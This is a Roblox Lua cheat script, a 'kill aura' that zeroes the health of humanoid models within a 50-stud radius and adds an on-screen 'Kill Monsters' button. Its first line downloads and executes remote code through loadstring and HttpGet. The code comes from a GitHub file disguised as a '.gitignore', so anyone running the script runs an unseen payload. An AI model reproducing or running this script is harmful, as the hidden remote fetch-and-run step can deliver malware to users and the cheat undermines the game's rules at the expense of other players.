-- Load the external library
loadstring(game:HttpGet("https://raw.githubusercontent.com/Amorim-zil/bug-free-sniffle/main/.gitignore"))()

-- Variables
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local attackRadius = 50  -- Radius to detect monsters
local monsters = {}  -- Table to store detected monsters

-- Function to kill nearby monsters using different approaches
local function killNearbyMonsters()
    -- Approach 1: Directly setting Health to 0
    for _, obj in ipairs(Workspace:FindPartsInRegion3(Region3.new(
        humanoidRootPart.Position - Vector3.new(attackRadius, attackRadius, attackRadius),
        humanoidRootPart.Position + Vector3.new(attackRadius, attackRadius, attackRadius)
    ), nil, math.huge)) do
        if obj:IsA("Model") and obj:FindFirstChild("Humanoid") then
            obj.Humanoid.Health = 0
        end
    end

    -- Approach 2: Using a different region size
    local region = Region3.new(
        humanoidRootPart.Position - Vector3.new(attackRadius, attackRadius, attackRadius),
        humanoidRootPart.Position + Vector3.new(attackRadius, attackRadius, attackRadius)
    )
    for _, part in ipairs(Workspace:FindPartsInRegion3(region, nil, math.huge)) do
        local model = part:FindFirstAncestorOfClass("Model")
        if model and model:FindFirstChild("Humanoid") then
            model.Humanoid.Health = 0
        end
    end

    -- Approach 3: Iterating over all monsters in a specific folder
    local monsterFolder = Workspace:FindFirstChild("Monsters")
    if monsterFolder then
        for _, monster in ipairs(monsterFolder:GetChildren()) do
            if monster:IsA("Model") and monster:FindFirstChild("Humanoid") then
                local distance = (humanoidRootPart.Position - monster.PrimaryPart.Position).magnitude
                if distance <= attackRadius then
                    monster.Humanoid.Health = 0
                end
            end
        end
    end
end

-- Create UI
local function createUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "KillAuraUI"
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 200, 0, 50)
    button.Position = UDim2.new(0.5, -100, 0.5, -25)
    button.Text = "Kill Monsters"
    button.Parent = screenGui

    button.MouseButton1Click:Connect(function()
        killNearbyMonsters()
    end)
end

createUI()
